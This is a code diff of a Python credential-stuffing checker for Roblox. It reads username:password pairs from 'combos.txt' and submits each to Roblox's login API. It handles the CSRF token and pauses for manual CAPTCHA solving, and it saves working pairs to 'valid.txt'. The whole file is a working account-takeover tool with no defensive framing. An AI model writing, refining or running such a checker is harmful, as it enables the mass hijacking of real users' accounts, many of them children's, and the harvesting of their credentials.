@@ -1,61 +1,74 @@
 import os
 import requests
-from bs4 import BeautifulSoup
+import json
 
-# Roblox login URL
+# Roblox login API
 login_url = 'https://auth.roblox.com/v1/login'
 
-# Headers to simulate a real browser request
+# HTTP headers
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    'User-Agent': 'Mozilla/5.0',
+    'Content-Type': 'application/json'
 }
 
-# Open Roblox login page in browser if CAPTCHA is suspected
+# Open Roblox login page if CAPTCHA detected
 def handle_captcha():
-    print("\n⚠️ CAPTCHA detected or suspicious response. Opening Roblox login page...")
+    print("\n[!] CAPTCHA detected. Opening Roblox login page...")
     os.system("termux-open-url https://www.roblox.com/login")
-    input("🔓 After solving the CAPTCHA in your browser, press Enter to continue...\n")
+    input("[!] After solving the CAPTCHA, press Enter to continue...")
 
-# Function to attempt login
+# Try to log in using credentials
 def try_login(username, password):
     session = requests.Session()
     session.headers.update(headers)
 
     payload = {
-        'username': username,
-        'password': password
+        "username": username,
+        "password": password
     }
 
-    # POST request to Roblox login API
-    response = session.post(login_url, data=payload)
+    # Get CSRF token
+    res = session.post(login_url, json=payload)
+    if res.status_code == 403 and "x-csrf-token" in res.headers:
+        session.headers["x-csrf-token"] = res.headers["x-csrf-token"]
+        res = session.post(login_url, json=payload)
 
-    # Check for possible CAPTCHA or unusual response
-    if "captcha" in response.text.lower() or response.status_code == 429:
-        handle_captcha()
+    # Handle CAPTCHA or block
+    try:
+        response_json = res.json()
+        if "captcha" in res.text.lower() or "captchaurl" in res.text.lower():
+            print("[!] CAPTCHA detected in response.")
+            handle_captcha()
+            return False
+    except json.JSONDecodeError:
+        print("[!] Invalid JSON response. Possible block or IP error.")
         return False
 
-    # Check for successful login (you may also inspect cookies or tokens here)
-    if "https://roblox.com/home" in response.url or response.status_code == 200 and "X-CSRF-TOKEN" in response.headers:
+    # Login result
+    if res.status_code == 200 and 'errors' not in res.json():
+        print(f"[+] SUCCESS: {username}:{password}")
+        with open("valid.txt", "a") as valid_file:
+            valid_file.write(f"{username}:{password}\n")
         return True
+    else:
+        print(f"[-] FAILED: {username}:{password}")
+        return False
 
-    return False
-
-# Read and test credentials from file
+# Read from combos.txt and attempt login
 def check_credentials(file_path):
-    with open(file_path, 'r') as file:
-        for line in file:
-            line = line.strip()
-            if ':' not in line:
-                continue  # Skip invalid lines
+    try:
+        with open(file_path, 'r', encoding='utf-8') as file:
+            for line in file:
+                line = line.strip()
+                if ':' not in line:
+                    continue
+                username, password = line.split(':', 1)
+                print(f"\n[*] Trying: {username}:{password}")
+                try_login(username, password)
+    except FileNotFoundError:
+        print("[!] File not found:", file_path)
+    except Exception as e:
+        print("[!] Error reading file:", str(e))
 
-            username, password = line.split(':', 1)
-            print(f"🔍 Attempting login: {username}:{password}")
-
-            if try_login(username, password):
-                print(f"✅ SUCCESS! Valid credentials: {username}:{password}")
-            else:
-                print(f"❌ Failed: {username}:{password}")
-
-# Replace with your credentials file path
-file_path = 'combos.txt'
-check_credentials(file_path)
+# Start checking credentials from combos.txt
+check_credentials('combos.txt')
